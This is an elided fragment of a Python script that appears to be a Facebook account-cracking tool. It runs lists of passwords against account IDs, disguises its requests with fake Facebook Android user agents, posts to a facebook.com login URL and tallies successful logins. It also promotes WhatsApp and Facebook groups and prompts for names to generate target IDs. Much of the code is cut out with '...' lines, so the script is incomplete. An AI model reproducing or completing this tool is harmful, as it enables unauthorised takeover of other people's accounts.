...
#coding=utf-8
#rana
fbks=('https://www.facebook.com/groups/281018091477223/?ref=share')
import os
try:
  ...
  #  print("To stop process press CTRL c")
    ...
    def rana(user):
        ...
        #        print('\r{}\033[1;94m[2F-KING] {} {} {} {}'.format(G, url, fax, px, mys))
                ...
                #print(response.text)
                continue
        sys.stdout.write('\r {} [MEHEDI] [{}|{}] [OK:{}] {}\r'.format(mys, str(loop), str(len(idx)), str(len(oku)) ,mys))
        sys.stdout.flush()
        loop += 1       
...
def menu(): 
			...
			if xd in ['1','01']:
				...
				os.system(f'xdg-open https://chat.whatsapp.com/JSpWq0EKXsxBH3zfwY8QWw');menu()
			elif xd in ['0','00']:
...
def gmail():
                ...
                print('\033[1;37m example: TERMUX.HACKER TEAM 2.0,\033[1;97m')
                l1()
                first = input(' Put first name: ')
                l1()
                print('\033[1;37m example: MD, Mehedi, Hasan \033[1;97m')
                l1()
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [ CYBER ] [%s] [\033[1;37mOK : %s ] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                     ...
                     #   ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.75,width=720,height=1640};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        ...
                        url = 'https://www.facebook.com/md.mehidehasan.96343?mibextid=ZbWKwL/auth/login'
